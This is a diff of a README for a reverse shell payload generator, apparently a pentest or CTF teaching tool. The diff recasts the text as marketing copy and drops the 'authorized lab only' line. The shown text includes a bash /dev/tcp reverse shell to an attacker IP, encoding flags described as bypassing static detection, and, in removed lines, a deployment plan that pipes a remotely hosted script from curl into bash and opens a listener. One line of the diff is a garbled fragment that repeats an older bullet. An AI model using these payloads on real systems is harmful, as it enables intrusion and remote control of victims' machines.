@@ -1,58 +1,55 @@
-# Project 05 — Shell Payload Generator
+# Project 05 — Professional Shell Payload Generator
 
-**25+ reverse shell templates across 12 languages, with encoding, obfuscation, OPSEC analysis, and full deployment planning.**
+**Author: Kuldeep Singh**
 
-**Authorized lab / CTF / penetration testing environments only.**
+---
 
-## What makes this different
+**Advanced payload orchestration engine featuring 25+ reverse shell templates across 12 languages, integrated encoding, OPSEC-aware obfuscation, and tactical deployment planning.**
 
-A basic generator is just a list of copy-paste one-liners. This is an engineer-grade payload system built around a typed template database, an encoding engine, an OPSEC analyser, and a deployment planner that generates the complete attack workflow — not just the payload.
+## Security Researcher Perspective
 
-| Feature | Basic generator | This generator |
+Generating a payload is the "Initial Access" phase of most simulated attacks. This tool elevates the process from simple copy-pasting to **Payload Engineering**. It provides researchers with a structured database of templates that include metadata on **Stealth Scores** and **Detection Footprints**, mapping directly to how modern EDR and SIEM solutions (Sigma, YARA, Suricata) identify malicious activity.
+
+## Technical Differentiators
+
+| Feature | Standard Generator | This Payload Engine |
 |---------|----------------|----------------|
-| Templates | ~5 hard-coded strings | 25+ typed `PayloadTemplate` objects with metadata |
-| Encoding | None | `plain` · `b64` · `url` · `ps_enc` (PowerShell -EncodedCommand) |
-| Obfuscation | None | Variable renaming + string-split for bash/python |
-| OPSEC analysis | None | Stealth score (1–10) + detection notes per payload |
-| Deployment plan | None | Listener + HTTP host + delivery + PTY upgrade, step by step |
-| Listener | None | Built-in raw TCP listener (`--listen PORT`) |
-| Filtering | None | Filter by platform, language, minimum stealth score |
-| Output formats | Print all | Table · single+OPSEC · cheat sheet |
+| **Template Logic** | Hard-coded strings | **Typed `PayloadTemplate` Objects** with metadata |
+| **Encoding Suite** | Plain text only | **Multi-stage**: Base64, URL, PowerShell `EncodedCommand` |
+| **Obfuscation** | None | **OPSEC-Focused**: Variable randomization & IP splitting |
+| **Stealth Profiling** | Manual guess | **Quantitative Stealth Scoring** (1–10) |
+| **Tactical Planning** | Payload only | **4-Step Deployment Workflow** (Listener → Host → Execute → Stabilize) |
+| **Integrated Listener** | Requires `nc` | **Built-in Threaded TCP Listener** |
+| **Reporting** | Console output | **Professional Cheat Sheet & JSON export** |
 
 ## Usage
 
 ```bash
-# Show all 25+ templates in a table
+# Intelligence: List all 25+ available templates
 python3 shellgen.py --list
 
-# Render one specific payload
+# Payload Generation: Standard bash reverse shell
 python3 shellgen.py --lhost 192.168.100.10 --lport 4444 --name bash-tcp
 
-# Base64-encode a payload (breaks /dev/tcp string matching)
+# Evasion: Base64-encode to bypass static string matching
 python3 shellgen.py --lhost 192.168.100.10 --lport 4444 --name python3-socket --encode b64
 
-# Apply obfuscation (variable name randomisation + IP splitting)
+# OPSEC: Apply variable randomization and IP obfuscation
 python3 shellgen.py --lhost 192.168.100.10 --lport 4444 --name bash-tcp --obfuscate
 
-# Render + print full 4-step deployment plan
+# Tactical Mapping: Generate complete 4-step deployment plan
 python3 shellgen.py --lhost 192.168.100.10 --lport 4444 --name bash-fifo --plan
 
-# Print all payloads as a compact cheat sheet
-python3 shellgen.py --lhost 192.168.100.10 --lport 4444 --cheatsheet
-
-# Filter to stealthy Linux payloads only
+# Stealth Filtering: Identify high-stealth Linux payloads (Score 6+)
 python3 shellgen.py --lhost 192.168.100.10 --lport 4444 --platform linux --min-stealth 6
 
-# Start a built-in TCP listener (no nc required)
+# Direct Action: Start integrated TCP listener for incoming shells
 python3 shellgen.py --listen 4444
-
-# PowerShell encoded command for Windows targets
-python3 shellgen.py --lhost 192.168.100.10 --lport 4444 --name ps-socket --encode ps_enc
 ```
 
-## Sample output
+## Sample Output
 
-```
+```text
   shellgen.py  |  lhost=192.168.100.10  lport=4444
 
   NAME                   LANG         PLATFORM   STEALTH                DESCRIPTION
@@ -61,43 +58,29 @@ python3 shellgen.py --lhost 192.168.100.10 --lport 4444 --name ps-socket --encod
   bash-fifo              bash         linux      █████░░░░░ 5/10        Named pipe shell — avoids /dev/tcp
   python3-socket         python3      any        █████░░░░░ 5/10        Python3 socket + pty.spawn
   socat-ssl              socat        linux      ████████░░ 8/10        socat SSL-encrypted PTY shell
-  ncat-ssl               netcat       linux      ███████░░░ 7/10        ncat with SSL encryption
-  awk-shell              awk          linux      ███████░░░ 7/10        gawk /inet/tcp — no nc/python needed
   ...
 
 
-  ╔══ BASH-TCP — Classic bash /dev/tcp redirect ═════════════════
+  ╔══ BASH-TCP — Classic bash /dev/tcp redirect ═════════════════════
   ║  Language  : bash
   ║  Stealth   : ██░░░░░░░░ 2/10
   ╠══ PAYLOAD
-
-  bash -i >& /dev/tcp/192.168.100.10/4444 0>&1
-
+  ║  bash -i >& /dev/tcp/192.168.100.10/4444 0>&1
   ╠══ OPSEC NOTES
-  ║  ▸ Spawns 'bash -i' which is logged by most EDR products
-  ║  ▸ '/dev/tcp' string matches hundreds of AV and SIEM signatures
-  ║  ▸ Use ONLY in noisy lab environments or as a last resort
-  ╚════════════════════════════════════════════════════════════════
-
-  ╔══ DEPLOYMENT PLAN — bash-tcp ══════════════════════════════════
-  STEP 1 — Start listener on attacker machine (Kali)
-  nc -lvnp 4444
-
-  STEP 2 — Host payload via HTTP
-  python3 -m http.server 4445 --directory /tmp
-
-  STEP 3 — Execute on target
-  curl http://192.168.100.10:4445/shell.sh | bash
-
-  STEP 4 — Stabilise shell
-  python3 -c 'import pty; pty.spawn("/bin/bash")'  → CTRL+Z → stty raw -echo; fg
-  ╚════════════════════════════════════════════════════════════════
+  ║  ▸ Spawns 'bash -i' which is flagged by most EDR behavioral rules
+  ║  ▸ '/dev/tcp' string matches high-fidelity SIGMA signatures
+  ║  ▸ RECOMMENDATION: Use only in noisy legacy or lab environments
+  ╚══════════════════════════════════════════════════════════════════
 ```
 
-## Key design decisions
+## Engineering & Design Decisions
 
-- **`PayloadTemplate` is a frozen dataclass** — the entire template database is immutable at runtime, which prevents accidental mutation and makes templates safe to share across threads
-- **Encoding is separate from templates** — the `EncodingEngine` is a pure static class; templates declare which encodings they support via their `encodable` list, so you can never accidentally apply `ps_enc` to a bash payload
+- **Immutable Template Core**: Utilizes `Frozen Dataclasses` for the `PayloadTemplate` database, ensuring that core payload definitions remain consistent and thread-safe throughout the session.
+- **Decoupled Encoding Engine**: Implements a standalone `EncodingEngine` class. Templates declare their compatibility, preventing invalid operations like applying PowerShell encoding to a Ruby payload.
+- **Detection-Led OPSEC Notes**: Each payload includes forensic-grade detection notes mapping to real-world defensive telemetry (Sigma, Suricata, YARA), bridging the gap between offensive execution and defensive visibility.
+- **Strategic Deployment Planner**: Automates the generation of a 4-step workflow, covering listener setup, payload hosting (via temporary HTTP servers), execution strings, and post-exploit PTY stabilization.
+- **Threaded Async Listener**: The built-in `--listen` mode spawns a background receiver thread, allowing the researcher to interact with multiple incoming shells without blocking the main engine's input.
+rate from templates** — the `EncodingEngine` is a pure static class; templates declare which encodings they support via their `encodable` list, so you can never accidentally apply `ps_enc` to a bash payload
 - **OPSEC notes mirror real detection engineering** — each note describes exactly what a Sigma/Suricata/YARA rule would match, teaching both the attack technique and how defenders catch it
 - **Obfuscation is intentionally shallow** — the goal is to illustrate the concept (break static string matching) not to implement actual AV evasion; deeper obfuscation is a module 3+ topic
 - **`--listen` uses threading** — the receive loop runs in a daemon thread while the main thread handles stdin, so you can type commands and receive output simultaneously without blocking
